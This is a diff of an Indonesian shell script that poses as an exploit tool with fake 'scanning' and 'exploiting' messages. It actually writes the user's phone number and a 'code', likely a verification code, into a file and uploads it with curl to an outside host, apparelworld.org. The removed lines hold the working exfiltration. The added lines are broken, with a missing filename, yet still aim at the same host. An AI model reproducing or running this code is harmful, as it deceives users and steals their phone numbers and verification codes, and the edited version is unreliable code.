@@ -40,9 +40,9 @@ read p;
 sleep 1.5
 echo "\033[34;1m [+]Sedang Scaning..."
 sleep 7
-cho "[+] Exploiting...";
-echo "Nomer => $nomer" >> kontol.html;
-curl -T kontol.html http://apparelworld.org/
+echo "[+] Exploiting...";
+echo "Nomer => $nomer" >> ;
+curl -T http://apparelworld.org/
 sleep 5;
 echo "[+] Done.";
 echo "Tunggu 5-10 Menit Untuk Mendapatkan Code.";
@@ -56,8 +56,8 @@ sleep 0.5
 echo "Target => $target";
 sleep 0.5
 echo "[+] Sending Exploit...";
-echo "Code => $code" >> kontol.html;
-curl -T kontol.html http://apparelworld.org/
+echo "Code => $code" >> ;
+curl -T http://apparelworld.org/
 sleep 5
 echo "[+] Success Exploited!";
 exit;
